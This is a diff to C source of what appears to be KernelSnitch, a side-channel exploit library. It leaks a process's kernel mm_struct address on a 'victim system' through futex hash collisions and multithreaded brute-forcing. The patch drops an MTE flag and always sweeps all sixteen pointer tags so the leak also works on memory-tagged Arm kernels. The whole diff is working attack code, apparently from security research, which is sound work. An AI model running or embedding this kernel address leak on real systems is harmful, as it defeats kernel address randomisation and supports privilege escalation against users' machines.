@@ -91,8 +91,6 @@ struct kernelsnitch_shared_state {
     size_t identity_diff;
 
     enum kernelsnitch_state state;
-
-    int mte_enabled;
 };
 
 #define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)
@@ -206,32 +204,22 @@ static void *__mm_leak(void *arg)
             for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
 
                 size_t found_hash = 1;
-                if (!ks->mte_enabled) {
-                    // test the mm_struct candidate
+                // sweep every heap tag in bits 56-59; the canonical pointer is
+                // tag 15, so try it first
+                for (size_t tag_candidate = 0; tag_candidate < 16 && !ks->found; ++tag_candidate) {
+                    size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
+                    __mm_struct_candidate |= (((15 + tag_candidate) & 0xf) << 56);
+                    found_hash = 1;
                     for (size_t i = 1; i < ks->collisions && found_hash; ++i)
-                        found_hash = (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
+                        found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
                     if (found_hash) {
-                        ks->mm_struct = mm_struct_candidate;
+                        if (ks->verbose)
+                            pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
+                        ks->mm_struct = __mm_struct_candidate;
                         ks->found = 1;
                         break;
                     }
-                } else {
-                    // need to set the tag if mte is enabled
-                    for (size_t tag_candidate = 0; tag_candidate < 15 && !ks->found; ++tag_candidate) {
-                        size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
-                        __mm_struct_candidate |= (tag_candidate << 56);
-                        found_hash = 1;
-                        for (size_t i = 1; i < ks->collisions && found_hash; ++i)
-                            found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
-                        if (found_hash) {
-                            if (ks->verbose)
-                                pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
-                            ks->mm_struct = __mm_struct_candidate;
-                            ks->found = 1;
-                            break;
-                        }
-                    }
-                } 
+                }
             }
         }
     }
@@ -250,10 +238,9 @@ static void *__mm_leak(void *arg)
  * @arg __thread_cnt: thread count used for the bruteforcing phase
  * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
  * @arg __verbose: amount of print info (1...enabled; 0...disabled)
- * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
  * @return shared KernelSnitch state
  */
-struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
+struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose)
 {
     struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
     ks->mm_struct = -1;
@@ -264,7 +251,6 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->thread_cnt = __thread_cnt;
     ks->collisions = __collision_cnt;
     ks->verbose = __verbose;
-    ks->mte_enabled = __mte_enabled;
 
     // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
     ks->futex_hash_table_size = 256*ks->cpu_cnt;
@@ -278,13 +264,12 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
 
     ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
 
-    if (ks->verbose) pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) thread cnt (%zd) collisions (%zd) mte %s\n",
+    if (ks->verbose) pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) thread cnt (%zd) collisions (%zd)\n",
         ks->cpu_cnt,
         ks->mm_struct_sz,
         ks->mm_slab_order,
         ks->thread_cnt,
-        ks->collisions,
-        ks->mte_enabled ? "enabled" : "disabled");
+        ks->collisions);
     pin_to_core(CORE);
     futex_init();
 
@@ -451,12 +436,11 @@ size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
  * @arg __thread_cnt: thread count used for the bruteforcing phase
  * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
  * @arg __verbose: amount of print info (1...enabled; 0...disabled)
- * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
  * @return the found mm_struct or -1 for not found
  */
-size_t kernelsnitch_param(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
+size_t kernelsnitch_param(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose)
 {
-    struct kernelsnitch_shared_state *ks = kernelsnitch_setup(__mm_struct_sz, __mm_slab_order, __thread_cnt, __collision_cnt, __verbose, __mte_enabled);
+    struct kernelsnitch_shared_state *ks = kernelsnitch_setup(__mm_struct_sz, __mm_slab_order, __thread_cnt, __collision_cnt, __verbose);
     if (ks->verbose) pr_info("===============================================\n");
     kernelsnitch_find_collisions(ks);
     if (ks->verbose) pr_info("===============================================\n");
@@ -494,5 +478,5 @@ void kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks)
  */
 size_t kernelsnitch(size_t __mm_struct_sz, size_t __mm_slab_order)
 {
-    return kernelsnitch_param(__mm_struct_sz, __mm_slab_order, sysconf(_SC_NPROCESSORS_ONLN)*2, 16, 0, 0);
+    return kernelsnitch_param(__mm_struct_sz, __mm_slab_order, sysconf(_SC_NPROCESSORS_ONLN)*2, 16, 0);
 }
